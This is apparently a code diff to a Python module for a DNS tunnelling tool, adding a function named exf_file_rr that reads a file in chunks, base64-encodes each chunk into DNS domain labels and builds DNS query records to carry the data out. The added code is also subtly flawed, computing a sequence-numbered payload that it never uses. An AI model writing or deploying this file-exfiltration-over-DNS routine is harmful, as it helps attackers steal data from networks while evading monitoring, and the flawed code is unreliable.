@@ -4,12 +4,13 @@
 import os
 import base64
 import dnslib
+import struct
 import binascii
 from bitstring import BitArray
 
 BUFFER_SIZE = 1024
-MAX_DOMAIN_LEN = 255
-MAX_LABEL_LEN = 63
+DNS_DOMAIN_LEN = 255
+DNS_LABEL_LEN = 63
 
 def scramble(data, offset, reverse=False):
     """ Scramble/descramble bytes with specified offset """
@@ -38,33 +39,32 @@ def random_bytes(n):
     """ Generate random bytearray with n-length """
     return bytearray(os.urandom(n))
 
-
 def encode_to_domain(data, domain, base_encoding, crypt=None):
     """ Encode data to DNS domain name (RFC 1035) """
 
-    if len(data) + len(domain) + 1 > MAX_DOMAIN_LEN:
+    if len(data) + len(domain) + 1 > DNS_DOMAIN_LEN:
         raise ValueError("The data size greater than 255 bytes!")
     
     if (crypt):
         data = crypt(data)
 
-    parts = None
-    if len(data) > MAX_LABEL_LEN:
-        parts = [data[i:i+MAX_LABEL_LEN] for i in range(0, len(data), MAX_LABEL_LEN)]
+    parts = [data]
+    if len(data) > DNS_LABEL_LEN:
+        parts = [data[i:i+DNS_LABEL_LEN] for i in range(0, len(data), DNS_LABEL_LEN)]
 
     string = ""
     for frag in parts:
         string += str(base_encoding(frag), 'ascii') + "."
     string += domain
 
-    if len(string) > MAX_DOMAIN_LEN:
+    if len(string) > DNS_DOMAIN_LEN:
         raise ValueError("The result string's length greater than 255 bytes!")
 
     return string
 
-def decode_from_domain(fake_domain, base_decoding, decrypt=None):
+def decode_from_domain(domain, base_decoding, decrypt=None):
     """ Decode data from DNS domain name"""
-    parts = fake_domain.split(".")
+    parts = domain.split(".")
     data = b''
 
     # Look for the presence of encoded bytes...
@@ -80,3 +80,19 @@ def decode_from_domain(fake_domain, base_decoding, decrypt=None):
         data = decrypt(data)
     
     return data
+
+def exf_file_rr(filename, domain, buffer_size=32):
+    requests = []
+    with open(filename, 'rb') as file:
+        data = file.read(buffer_size)
+        part = 0
+        
+        while (data):
+            payload = struct.pack(f'L{buffer_size}s', part, data)
+            domain_payload = encode_to_domain(data, domain, base64.b64encode)
+            requests += [dnslib.DNSRecord.question(domain_payload)]
+            
+            data = file.read(buffer_size)
+            part += 1
+    
+    return requests
